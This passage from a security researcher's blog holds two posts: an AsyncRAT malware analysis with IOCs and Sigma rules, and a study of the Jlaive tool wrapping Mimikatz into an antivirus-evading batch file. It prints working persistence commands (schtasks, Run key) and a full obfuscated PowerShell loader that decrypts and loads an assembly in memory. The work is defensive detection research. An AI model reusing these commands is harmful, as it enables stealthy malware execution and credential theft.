administrator permissions to see how the sample behaved. I did this because in the static part we have seen that the behavior could vary depending on whether it was executed in the administrator context.\\r\\n\\r\\n#### privileged execution - Genealogy\\r\\n\\r\\n![admingenealogy](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/12-genealogy.png)\\r\\n\\r\\n#### non-privileged execution - Genealogy\\r\\n\\r\\n![admingenealogy](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/12-genealogynonprivilege.png)\\r\\n\\r\\nAs can be seen, there are some differences when the sample was executed with privileges and when not. For example, in the first image, which corresponds to the execution with privileges, there are 3 additional processes which are the following.\\r\\n\\r\\n```\\r\\n|_ cmd.exe (7380)\\r\\n\\t|_ Conhost.exe (8972)\\r\\n\\t|_ schtasks.exe (4152)\\r\\n```\\r\\n\\r\\nThis is because the execution of the process 7380 `cmd.exe`, is the behavior related to setting the scheduled task. However, if the sample is run without administrator permissions, the scheduled task cannot be generated.\\r\\n\\r\\nWe are going to go into detail about the processes to see the main actions they performed and that could be of interest in order to generate some kind of detection or identification of patterns. To do this, we will focus on the execution with administrator permissions and in case there is something different in the other execution, it will be named.\\r\\n\\r\\n#### Stub.exe - 2740\\r\\n\\r\\n```\\r\\nC:\\\\Users\\\\lab\\\\Desktop\\\\Stub.exe\\r\\n```\\r\\n\\r\\nThis is the AsyncRAT sample. The execution was performed with administrator privileges.\\r\\n\\r\\nThis process, as we saw before, would be in charge of creating certain files in the system. First of all, what it does is to create in the `%appdata%` directory a copy of itself.\\r\\n\\r\\n![writeruntim](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/14-runtimebroker.png)\\r\\n\\r\\nThen, it creates the batch file also in `%appdata%`, which will be executed later to perform different actions in the operating system.\\r\\n\\r\\n![writefilesbat](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/15-batfile.png)\\r\\n\\r\\nAs for registry keys, there is no significant activity.\\r\\n\\r\\n:::info\\r\\n\\r\\nDifferent behavior in the sample run without privileges.\\r\\n\\r\\n:::\\r\\n\\r\\n**However, in the case of unprivileged execution, there would be a modification in the registry keys for persistence, using the key `HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Runtime Broker`**.\\r\\n\\r\\n![registrykey](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/16-registrykeyrun.png)\\r\\n\\r\\n#### cmd.exe - 7380\\r\\n\\r\\n```\\r\\n\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\" /c schtasks /create /f /sc onlogon /rl highest /tn \\"Runtime Broker\\" /tr \'\\"C:\\\\Users\\\\lab\\\\AppData\\\\Roaming\\\\Runtime Broker.exe\\"\' & exit\\r\\n```\\r\\n\\r\\nThis process is basically in charge of launching the `schtasks.exe` binary. It is important to mention, as we are seeing and will see throughout the analysis, that since this is a 32bit sample, the executions will be related to the `C:\\\\Windows\\\\SysWOW64\\\\` directory.\\r\\n\\r\\n![registrykey](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/17-scheduledcreatedprocess.png)\\r\\n\\r\\nThis process will not exist when running AsyncRAT without administrator permissions.\\r\\n\\r\\n#### schtasks.exe - 4152\\r\\n\\r\\n```\\r\\nschtasks  /create /f /sc onlogon /rl highest /tn \\"Runtime Broker\\" /tr \'\\"C:\\\\Users\\\\lab\\\\AppData\\\\Roaming\\\\Runtime Broker.exe\\"\' \\r\\n```\\r\\n\\r\\nThe task is generated in the system to be executed at each login of any user with administrator permissions.\\r\\n\\r\\n```\\r\\n/f -> A value that forcefully creates the task and suppresses warnings if the specified task already exists.\\r\\n/sc onlogon -> In each login\\r\\n/rl highest -> Max privileges\\r\\n/tn \\"Runtime Broker\\" -> Task name \\r\\n/tr \\"C:\\\\Users\\\\lab\\\\AppData\\\\Roaming\\\\Runtime Broker.exe\\" -> Task run to execute\\r\\n```\\r\\n\\r\\n![task](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/18-taskscheduled.png)\\r\\n\\r\\n#### cmd.exe - 8840\\r\\n\\r\\n```\\r\\nC:\\\\Windows\\\\system32\\\\cmd.exe /c \\"\\"C:\\\\Users\\\\lab\\\\AppData\\\\Local\\\\Temp\\\\tmp3959.tmp.bat\\"\\"\\r\\n```\\r\\n\\r\\nThis process is in charge of executing the bat file that was created during the execution of the `Stub.exe` binary. It is important to mention that **the name of the batch file varies according to the execution**, however, **the pattern is always the same**. The following RegEx would work to detect this.\\r\\n\\r\\n```\\r\\n.*tmp[a-zA-Z1-9]{4}.tmp.bat\\r\\n```\\r\\n\\r\\n![task](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/19-batnames.png)\\r\\n\\r\\n#### timeout.exe - 6272\\r\\n\\r\\n```\\r\\ntimeout  3 \\r\\n```\\r\\n\\r\\nThe malware uses a timeout of 3 seconds before it starts performing the rest of the actions.\\r\\n\\r\\n#### Runtime Broker.exe - 4080\\r\\n\\r\\n```\\r\\n\\"C:\\\\Users\\\\lab\\\\AppData\\\\Roaming\\\\Runtime Broker.exe\\" \\r\\n```\\r\\n\\r\\nAs can be seen from the name of the process, the malware tries to impersonate the legitimate Microsoft Windows binary `runtimebroker.exe`. However, it can be noticed in this case that there is a space between the two words.\\r\\n\\r\\nHere the communication with the C2 server is established. The ports used in this case are 8808, 7707 and 6606. The destination IP address is 217.195.197[.]70.\\r\\n\\r\\n![connections](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/20-connections.png)\\r\\n\\r\\nOn the other hand, another indicator that could help us to identify the sample and the family during the analysis is the Mutex used, which in this case is `AsyncMutex_6SI8OkPnk`.\\r\\n\\r\\n![mutex](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/22-MutantAsync.png)\\r\\n\\r\\nDuring the execution of `Runtime Broker.exe`, I proceeded to extract the .NET assembly from memory to verify if it was the same `Stub.exe` binary analyzed later or if it presented some difference when is launched. During this extraction, the following assemblies were obtained from memory.\\r\\n\\r\\n| File name      | SHA1 | Comments |\\r\\n| ----------- | ----------- | ----------- |\\r\\n| aB.exe      | 76AF794B85E4A4BA75C5703DF1207B7A6798BF2E       | Same sample as `Stub.exe` |\\r\\n| MessagePackLib.dll   |  16CC8C3A461A6CE5A7ED1FF569EA61B8D9BA143E        | At the time of analysis, 41/68 engines in VT detect it as malicious. Different family names.|\\r\\n| Recovery.dll   | 93E9469789A4ECD28E30006D1CE10DBFFBD36D7C       | At the time of analysis, 44/68 engines in VT detect it as malicious. Code protected by [Reactor](https://www.eziriz.com/). |\\r\\n| System.Data.SQLite.dll |  B9D5AF76D8DF1C4EE4CCBA33B2AFA8300952D923        | Mixed-mode assembly for System.Data.SQLite. More information [here](https://system.data.sqlite.org/index.html/doc/trunk/www/downloads.wiki). |\\r\\n| Newtonsoft.Json.dll  |  E68B369BC131A32D5233EE395F47B337C2469042        | Json.NET is a popular high-performance JSON framework for .NET |\\r\\n\\r\\n#### aB.exe\\r\\n\\r\\nThe assembly `aB.exe` is the same `Stub.exe` file, which in turn is also `Runtime Broker.exe`. \\r\\n\\r\\n#### MessagePackLib.dll\\r\\n\\r\\nThis DLL does not contain any packers or code protectors. 41 out of 68 [VT](https://www.virustotal.com/gui/file/cd89c8c9bb614fac779491b98ed425f90b01412381e02392fb27b36db3568b0f) engines detect this DLL as malicious.\\r\\n\\r\\n![nopacker](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/24-message.png)\\r\\n\\r\\nTaking a look at the assembly, you can see that the class structure does not seem to be very complex, and with a little patience you could identify its functionality (if you are interested in the sample, ask me privately).\\r\\n\\r\\n![assemblymessage](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/25-messagepackassembly.png)\\r\\n\\r\\n#### Recovery.dll\\r\\n\\r\\nIn this case, it has been possible to verify the existence of Reactor, [called by itself as a .NET code protection](https://www.eziriz.com/) as can be seen on its website.\\r\\n\\r\\n![recoverypacker](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/23-dieReactor.png)\\r\\n\\r\\nAs for the assembly, it can be verified that there is a protection of the code, since many strings and classes are randomized at the moment of observing their possible logic.\\r\\n\\r\\n![recoverypacker](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/26-recoveryassembly.png)\\r\\n\\r\\nIn a process of trying to remove the code protection, it is possible to see in a more readable way part of the code, identifying messages of actions that the assembly could try, in this case as seen in the image, related to the obtaining of Firefox cookies.\\r\\n\\r\\n![unprotectedcode](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/27-codeunprotected.png)\\r\\n\\r\\n### High level graph\\r\\n\\r\\nIn order to have a graphical view of the most important events that take place during the execution of AsyncRAT, a behavior graph has been elaborated where the events generated in the system during its execution can be seen.\\r\\n\\r\\n![graph](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/_graph.jpg)\\r\\n\\r\\n### Diamond model\\r\\n\\r\\n![graph](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/_diamond.jpg)\\r\\n\\r\\n## ATT&CK\\r\\n\\r\\n| Technique      | Kill chain phase | Diamond vertex | Comments | \\r\\n| ----------- | ----------- | ----------- | ----------- |\\r\\n| T1566.001 - Phishing: Spearphishing Attachment | Delivery | Capability | Email with ZIP file attached |\\r\\n| T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | Installation | Capability | Set registry key if non-privileged user executes the payload |\\r\\n| T1053.005 - Scheduled Task/Job: Scheduled Task | Installation | Capability | Creates new scheduled task if privileged user executes the payload |\\r\\n| T1036.005 - Masquerading: Match Legitimate Name or Location | Execution | Capability | Writes itself as a file named Runtime Broker.exe saved in %APPDATA% |\\r\\n| T1571 - Non-Standard Port | C2 | Infrastructure | Use the ports 8808, 7707 and 6606 for communication |\\r\\n| T1059.003 - Command and Scripting Interpreter: Windows Command Shell | Execution | Capability | Executes batch file created previously |\\r\\n| T1027 - Obfuscated Files or Information | Exploitation | Capability | .NET Reactor is used for code protection |\\r\\n| T1095 - Non-Application Layer Protocol | C2 | Infrastructure | TCP is used for C2 communications |\\r\\n\\r\\n## IOCs\\r\\n\\r\\n* 217.195.197[.]70 through 6606, 7707, 8808 ports\\r\\n* 76AF794B85E4A4BA75C5703DF1207B7A6798BF2E\\r\\n* 16CC8C3A461A6CE5A7ED1FF569EA61B8D9BA143E\\r\\n* 93E9469789A4ECD28E30006D1CE10DBFFBD36D7C\\r\\n* Mutex `AsyncMutex_6SI8OkPnk`\\r\\n\\r\\n## Sigma rules\\r\\n\\r\\n***The sigma rules created are specifics for this payload.*** There will be different payloads used by AsyncRAT with the same name or different. Is important to mention that the original filename embbeded in this case is `Stub.exe`. This is interesting because if the adversaries create new payloads, maybe the original filename will still being the same.\\r\\n\\r\\n```yml\\r\\ntitle: Detect AsyncRAT persistence with schtasks based on specific payload\\r\\nid: 4410f0ad-3a1c-4e21-9e3a-fa55336aa123\\r\\ndescription: Detect the execution of the AsyncRAT payload to launch schtask for persistence.\\r\\nstatus: experimental\\r\\ndate: 2022/06/01\\r\\nmodified: 2022/06/01\\r\\nauthor: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)\\r\\nreferences:\\r\\n    - https://jstnk9.github.io/jstnk9/research/AsyncRAT-Analysis\\r\\n    - https://www.virustotal.com/gui/file/79068b82bcf0786b6af1b7cc96de1bf4e1a66b0d95e7e72ed1b1054443f6c5e3\\r\\nlogsource:\\r\\n  product: windows\\r\\n  category: process_creation\\r\\ndetection:\\r\\n  parent_selection:\\r\\n    ParentImage|endswith: \'Stub.exe\'\\r\\n  selection1:\\r\\n    Image|endswith: \'\\\\cmd.exe\'\\r\\n    CommandLine|contains|all:\\r\\n      - \'schtasks \'\\r\\n      - \'\\\\AppData\\\\Roaming\\\\\'\\r\\n      - \'.exe\'\\r\\n  condition: parent_selection and selection1\\r\\nfalsepositives:\\r\\n    - Unknown\\r\\nlevel: medium\\r\\ntags:\\r\\n    - attack.persistence\\r\\n    - attack.T1053.005\\r\\n```\\r\\n\\r\\n```yml\\r\\ntitle: Detect AsyncRAT execution based on specific payload\\r\\nid: ac891380-958b-4c08-a77d-8e149d63d741\\r\\ndescription: Detect the execution of the AsyncRAT payload to establish registry key for persistence.\\r\\nstatus: experimental\\r\\ndate: 2022/06/01\\r\\nmodified: 2022/06/01\\r\\nauthor: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)\\r\\nreferences:\\r\\n    - https://jstnk9.github.io/jstnk9/research/AsyncRAT-Analysis\\r\\n    - https://www.virustotal.com/gui/file/79068b82bcf0786b6af1b7cc96de1bf4e1a66b0d95e7e72ed1b1054443f6c5e3\\r\\nlogsource:\\r\\n  product: windows\\r\\n  category: registry_set\\r\\ndetection:\\r\\n  selection:\\r\\n    EventType: SetValue\\r\\n    Image|endswith: \'Stub.exe\'\\r\\n    TargetObject|endswith: \'\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\\'\\r\\n    Details|contains: \'.exe\'\\r\\n  condition: selection\\r\\nfalsepositives:\\r\\n    - Unknown\\r\\nlevel: medium\\r\\ntags:\\r\\n    - attack.persistence\\r\\n    - attack.t1547.001\\r\\n```\\r\\n\\r\\nIn the original [Sigma](https://github.com/SigmaHQ/sigma/tree/master/rules/windows) repository, there are a large number of generic rules that can help in the detection of this malware.\\r\\n\\r\\n<h2> Contact </h2>\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/"},{"id":"Jlaive-Antivirus-Evasion-Tool","metadata":{"permalink":"/jstnk9/research/Jlaive-Antivirus-Evasion-Tool","source":"@site/research/2022-05-24-Jlaive-Antivirus-Evasion-Tool/2022-05-24-Jlaive-Antivirus-Evasion-Tool.md","title":"Using Jlaive to create batch files from .NET assemblies for defense evasion","description":"Summary","date":"2022-05-24T00:00:00.000Z","formattedDate":"May 24, 2022","tags":[{"label":"threat hunting","permalink":"/jstnk9/research/tags/threat-hunting"},{"label":"detection","permalink":"/jstnk9/research/tags/detection"},{"label":"visibility","permalink":"/jstnk9/research/tags/visibility"},{"label":"research","permalink":"/jstnk9/research/tags/research"},{"label":".NET","permalink":"/jstnk9/research/tags/net"}],"readingTime":6.245,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"Analyzing AsyncRAT distributed in Colombia by Blind Eagle","permalink":"/jstnk9/research/AsyncRAT-Analysis"},"nextItem":{"title":"Executing SCR files using desk.cpl and InstallScreenSaver API Call","permalink":"/jstnk9/research/InstallScreenSaver-SCR-files"}},"content":"## Summary\\r\\n\\r\\nJlaive is a project created to evade antivirus by creating batch files from .NET assemblies. The way it does it is very interesting and gives a new window of opportunities to actors to evade defenses and execute their payloads.\\r\\n\\r\\nYou can find the project on their official GitHub: https://github.com/ch2sh/Jlaive\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## Creating the batch file with Jlaive\\r\\n\\r\\nIn order to test the operation and the different events generated by this tool on a system, batch files must first be generated. The project currently provides two ways to do this.\\r\\n\\r\\n* Using the CLI file: [Jlaive-CLI](https://github.com/ch2sh/Jlaive/tree/main/Jlaive-CLI)\\r\\n* Using the GUI: [Jlaive](https://github.com/ch2sh/Jlaive/tree/main/Jlaive)\\r\\n\\r\\nTo test the behavior of the generated batch file, we are going to use an assembly from a known GitHub project that aims to load Mimikatz in memory through an injection.\\r\\n\\r\\nThe configuration used in Jlaive to create the batch file was as follows.\\r\\n\\r\\n![configuration-jlaive](https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/1-creatingbatch.png)\\r\\n\\r\\n## Executing the assembly (Mimikatz batch file)\\r\\n\\r\\nFor this case, the .NET assembly used is KatzNetAssembly, which can be found in their GitHub https://github.com/med0x2e/NET-Assembly-Inject-Remote.\\r\\n\\r\\nWhen Jlaive is used to generate the batch file, the result is the expected .bat file. Looking at the contents of the .bat file in this case, we can see something like the following image.\\r\\n\\r\\n![codemimi](https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/2-codemimikatz.jpg)\\r\\n\\r\\nAs a test, I uploaded to VirusTotal both the original KatzNetAssembly binary and the generated batch file to check that vendors detected both as malicious, since Mimikatz is considered malicious by the vast majority of vendors.\\r\\n\\r\\nFirst, the KatzNetAssembly binary was detected by 43 different engines.\\r\\n\\r\\n![katz_vt](https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/3-katznetassemblyVT.jpg)\\r\\n\\r\\nIn contrast, the batch file generated above was not detected by any of them.\\r\\n\\r\\n![katzbatch_vt](https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/4-katznetassemblybatchVT.jpg)\\r\\n\\r\\nAs soon as the .bat file is executed, you can see how Mimikatz is loaded for use by the user.\\r\\n\\r\\n![Mimikatzrunning](https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/5-mimirunning.png)\\r\\n\\r\\n### High level processes events\\r\\n\\r\\nWhen the batch file is executed, different events take place in the operating system, ranging from the creation of temporary files to be used (for compilation purposes) to the copying of the legitimate powershell binary. The following image is a high-level visualization of the events that occur in the operating system.  \\r\\n\\r\\n![processes_events](https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/procdot_1.png)\\r\\n\\r\\nThe quality of the image is not the best (procdot pls :D), but it is useful to see at a high level all the events that happen related to files, processes, threads, registry keys, etc. In the following sections we will go in detail in the most important events of the previous image.\\r\\n\\r\\n### Genealogy\\r\\n\\r\\nTaking a look at the process genealogy generated after the execution, we can see the following activity that took place when we executed the batch file:\\r\\n\\r\\n![genealogy](https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/6-genologyprocessmimikatz.png)\\r\\n\\r\\nFrom top to bottom, the processes with their corresponding command lines that are launched during execution are as follows.\\r\\n\\r\\n### cmd.exe - 2980\\r\\n\\r\\n```\\r\\nC:\\\\Windows\\\\system32\\\\cmd.exe /c \\"\\"C:\\\\Users\\\\lab\\\\Desktop\\\\mimi\\\\NET-Assembly-Inject-Remote-master\\\\KatzNetAssembly\\\\bin\\\\Debug\\\\KatzNetAssembly.bat\\" \\"\\r\\n```\\r\\n\\r\\nThis is the initial execution of the batch file. From this point on, the auto-generated batch file performs different actions on the system when it is executed.\\r\\n\\r\\n### cmd.exe - 9420\\r\\n\\r\\n```\\r\\nC:\\\\Windows\\\\system32\\\\cmd.exe  /S /D /c\\" echo F\\"\\r\\n```\\r\\n\\r\\nThis process does not perform any particular action. This is because in the first lines of the batch file the following information can be observed.\\r\\n\\r\\n![twocommands](https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/7-twocmm.png)\\r\\n\\r\\nLine 2 of the previous image shows how the `|` character exists without being escaped by `^`. Therefore, the first part before the `|` character will be launched as a new process that will simply do a `echo F` (this same cmd.exe process with PID 9420), and the second part after the `|` character will be the execution of a new process called by `xcopy.exe`, which we will see its purpose below.\\r\\n\\r\\n### xcopy.exe - 10188 \\r\\n\\r\\n```\\r\\nxcopy  C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe \\"C:\\\\Users\\\\lab\\\\Desktop\\\\mimi\\\\NET-Assembly-Inject-Remote-master\\\\KatzNetAssembly\\\\bin\\\\Debug\\\\KatzNetAssembly.bat.exe\\" /y\\r\\n```\\r\\n\\r\\nXcopy is a Microsoft Windows binary that can be used to copy files and directories. In this case, the copy that is made is `powershell.exe` with the same name as the initial batch file, leaving finally in this case the name `KatzNetAssembly.bat.exe`.\\r\\n\\r\\n![writefilesxcopy](https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/8-createdfileswrite.jpg)\\r\\n\\r\\n### attrib.exe - 3672\\r\\n\\r\\n```\\r\\nattrib  +s +h \\"C:\\\\Users\\\\lab\\\\Desktop\\\\mimi\\\\NET-Assembly-Inject-Remote-master\\\\KatzNetAssembly\\\\bin\\\\Debug\\\\KatzNetAssembly.bat.exe\\"\\r\\n```\\r\\n\\r\\n`attrib` is another Microsoft Windows utility. It is used in this case to set attributes assigned to the newly copied file.\\r\\n\\r\\n* +s: Sets the System file attribute. \\r\\n* +h: Sets the Hidden file attribute.\\r\\n\\r\\n### KatzNetAssembly.bat.exe - 8576\\r\\n\\r\\n```\\r\\nKatzNetAssembly.bat.exe  -noprofile  -executionpolicy bypass -command $FlOctL = [System.IO.File]::ReadAllText(\'C:\\\\Users\\\\lab\\\\Desktop\\\\mimi\\\\NET-Assembly-Inject-Remote-master\\\\KatzNetAssembly\\\\bin\\\\Debug\\\\KatzNetAssembly.bat\').Split([Environment]::NewLine);$hUtefJ = $FlOctL[$FlOctL.Length - 1];$kADuSQ = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\'dXNpbmcgU3lzdGVtLlRleHQ7dXNpbmcgU3lzdGVtLklPO3VzaW5nIFN5c3RlbS5JTy5Db21wcmVzc2lvbjt1c2luZyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5OyBwdWJsaWMgY2xhc3Mgc2t2Z1pSIHsgcHVibGljIHN0YXRpYyBieXRlW10geVhMZVdlKGJ5dGVbXSBpbnB1dCwgYnl0ZVtdIGtleSwgYnl0ZVtdIGl2KSB7IEFlc01hbmFnZWQgYWVzID0gbmV3IEFlc01hbmFnZWQoKTsgYWVzLk1vZGUgPSBDaXBoZXJNb2RlLkNCQzsgYWVzLlBhZGRpbmcgPSBQYWRkaW5nTW9kZS5QS0NTNzsgSUNyeXB0b1RyYW5zZm9ybSBkZWNyeXB0b3IgPSBhZXMuQ3JlYXRlRGVjcnlwdG9yKGtleSwgaXYpOyBieXRlW10gZGVjcnlwdGVkID0gZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soaW5wdXQsIDAsIGlucHV0Lkxlbmd0aCk7IGRlY3J5cHRvci5EaXNwb3NlKCk7IGFlcy5EaXNwb3NlKCk7IHJldHVybiBkZWNyeXB0ZWQ7IH0gcHVibGljIHN0YXRpYyBieXRlW10geFpQcEdaKGJ5dGVbXSBieXRlcykgeyBNZW1vcnlTdHJlYW0gbXNpID0gbmV3IE1lbW9yeVN0cmVhbShieXRlcyk7IE1lbW9yeVN0cmVhbSBtc28gPSBuZXcgTWVtb3J5U3RyZWFtKCk7IHZhciBncyA9IG5ldyBHWmlwU3RyZWFtKG1zaSwgQ29tcHJlc3Npb25Nb2RlLkRlY29tcHJlc3MpOyBncy5Db3B5VG8obXNvKTsgZ3MuRGlzcG9zZSgpOyBtc2kuRGlzcG9zZSgpOyBtc28uRGlzcG9zZSgpOyByZXR1cm4gbXNvLlRvQXJyYXkoKTsgfSB9\'));Add-Type -TypeDefinition $kADuSQ;[System.Reflection.Assembly]::Load([skvgZR]::xZPpGZ([skvgZR]::yXLeWe([System.Convert]::FromBase64String($hUtefJ), [System.Convert]::FromBase64String(\'NWgsuaovf9gO9aKy86zcaVaagsVYYBrngI5j7GXrTW8=\'), [System.Convert]::FromBase64String(\'oEMFGnnW7fwO+yXIvucIbA==\')))).EntryPoint.Invoke($null, (, [string[]] (\'\')))\\r\\n```\\r\\n\\r\\nThe `KatzNetAssembly.bat.exe` file is actually `PowerShell.exe`, which in this case is executed through a series of parameters and a command through `-command`, where it first reads the batch file information and then loads the assembly in memory to run Mimikatz.\\r\\n\\r\\nThis is achieved by the `Add-Type` cmdlet which adds the .NET class to the `PowerShell` session and with the help of `System.Reflection.Assembly::Load` the payload is loaded into memory. \\r\\n\\r\\nWhen these processes are executed to perform such compilations, it is important to know that there are a series of temporary files that are generated in the system. In this case, we will focus a little more on the files named `wzpaloqi.0.cs` and `wzpaloqi.cmdline`. The latter will be used later by `csc.exe` which contains addresses to compile the code.\\r\\n\\r\\n![tmpfiles](https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/9-tmpfiles.jpg)\\r\\n\\r\\nSubsequently, it also removes these files from the system.\\r\\n\\r\\n![tmpfilesdeleted](https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/9-tmpfilesdelete.jpg)\\r\\n\\r\\n### csc.exe - 5952\\r\\n\\r\\n```\\r\\n\\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\\" /noconfig /fullpaths @\\"C:\\\\Users\\\\lab\\\\AppData\\\\Local\\\\Temp\\\\wzpaloqi.cmdline\\"\\r\\n```\\r\\n\\r\\nDue to the above execution to load the assembly into memory, `csc.exe` is launched to perform the compilation (`csc.exe` is used by .NET to compile C# code). \\r\\n\\r\\nAs stated above, the `wzpaloqi.cmdline` file that is passed as a parameter to `csc.exe` contains the addresses to compile the code. In this case, the contents are as follows\\r\\n\\r\\n```\\r\\n/t:library /utf8output /R:\\"System.dll\\" /R:\\"C:\\\\Windows\\\\assembly\\\\GAC_MSIL\\\\System.Management.Automation\\\\1.0.0.0__31bf3856ad364e35\\\\System.Management.Automation.dll\\" /out:\\"C:\\\\Users\\\\lab\\\\AppData\\\\Local\\\\Temp\\\\wzpaloqi.dll\\" /D:DEBUG /debug+ /optimize- /warnaserror  \\"C:\\\\Users\\\\lab\\\\AppData\\\\Local\\\\Temp\\\\wzpaloqi.0.cs\\"\\r\\n```\\r\\n\\r\\nNote the use of the `/t` parameter to generate a `Library` TargetType. Also the references to the `System.dll` and `System.Management.Automation.dll` (Powershelll) DLLs. Finally, the output file to `wzpaloqi.dll`.\\r\\n\\r\\n![tmpfilesdeleted](https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/10-dllcreated.jpg)\\r\\n\\r\\nThe `wzpaloqi.0.cs` file contains the definition of the class that was previously used by the `Add-Type` cmdlet in the `PowerShell` execution. The content of this C# file would look like the following.\\r\\n\\r\\n```c\\r\\nusing System.Text;\\r\\nusing System.IO;\\r\\nusing System.IO.Compression;\\r\\nusing System.Security.Cryptography;\\r\\npublic class sIRAVQ {\\r\\n  public static byte[] agudvC(byte[] input, byte[] key, byte[] iv) {\\r\\n    AesManaged aes = new AesManaged();\\r\\n    aes.Mode = CipherMode.CBC;\\r\\n    aes.Padding = PaddingMode.PKCS7;\\r\\n    ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);\\r\\n    byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length);\\r\\n    decryptor.Dispose();\\r\\n    aes.Dispose();\\r\\n    return decrypted;\\r\\n  }\\r\\n  public static byte[] WpDGoD(byte[] bytes) {\\r\\n    MemoryStream msi = new MemoryStream(bytes);\\r\\n    MemoryStream mso = new MemoryStream();\\r\\n    var gs = new GZipStream(msi, CompressionMode.Decompress);\\r\\n    gs.CopyTo(mso);\\r\\n    gs.Dispose();\\r\\n    msi.Dispose();\\r\\n    mso.Dispose();\\r\\n    return mso.ToArray();\\r\\n  }\\r\\n}\\r\\n```\\r\\n\\r\\n### cvtress.exe - 9520\\r\\n\\r\\n```\\r\\nC:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \\"/OUT:C:\\\\Users\\\\lab\\\\AppData\\\\Local\\\\Temp\\\\RES7B30.tmp\\" \\"c:\\\\Users\\\\lab\\\\AppData\\\\Local\\\\Temp\\\\CSC73E174637C7249A1B3624F5536864A1.TMP\\"\\r\\n```\\r\\n\\r\\nThe purpose of `cvtress.exe` is to convert resources to objects at compile time. These objects will eventually be the ones linked into the final .exe.\\r\\n\\r\\n## Sigma rule\\r\\n\\r\\nThe behavior of this project is very characteristic, which can help us to create detection rules. For this reason, the following sigma rule can help us to detect these behaviors in our systems.\\r\\n\\r\\nLink to sigma rule: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_jlaive_batch_execution.yml\\r\\n\\r\\n```yml\\r\\ntitle: Jlaive Usage For Assembly Execution In-Memory\\r\\nid: 0a99eb3e-1617-41bd-b095-13dc767f3def\\r\\ndescription: Detect the use of Jlaive to execute assemblies in a copied PowerShell \\r\\nstatus: experimental\\r\\ndate: 2022/05/24\\r\\nmodified: 2022/05/24\\r\\nauthor: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)\\r\\nreferences:\\r\\n    - https://twitter.com/VakninHai/status/1517027824984547329\\r\\n    - https://github.com/ch2sh/Jlaive\\r\\nlogsource:\\r\\n  product: windows\\r\\n  category: process_creation\\r\\ndetection:\\r\\n  parent_selection:\\r\\n    ParentImage|endswith: \'\\\\cmd.exe\'\\r\\n    ParentCommandLine|endswith: \'.bat\'\\r\\n  selection1:\\r\\n    Image|endswith: \'\\\\xcopy.exe\'\\r\\n    CommandLine|contains|all:\\r\\n      - \'powershell.exe\'\\r\\n      - \'.bat.exe\'\\r\\n  selection2:\\r\\n    Image|endswith: \'\\\\attrib.exe\'\\r\\n    CommandLine|contains|all:\\r\\n      - \'+s\'\\r\\n      - \'+h\'\\r\\n      - \'.bat.exe\'\\r\\n  condition: parent_selection and (1 of selection*)\\r\\nfalsepositives:\\r\\n    - Unknown\\r\\nlevel: medium\\r\\ntags:\\r\\n    - attack.execution\\r\\n    - attack.t1059.003\\r\\n```\\r\\n\\r\\n<h2> Contact </h2>\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: 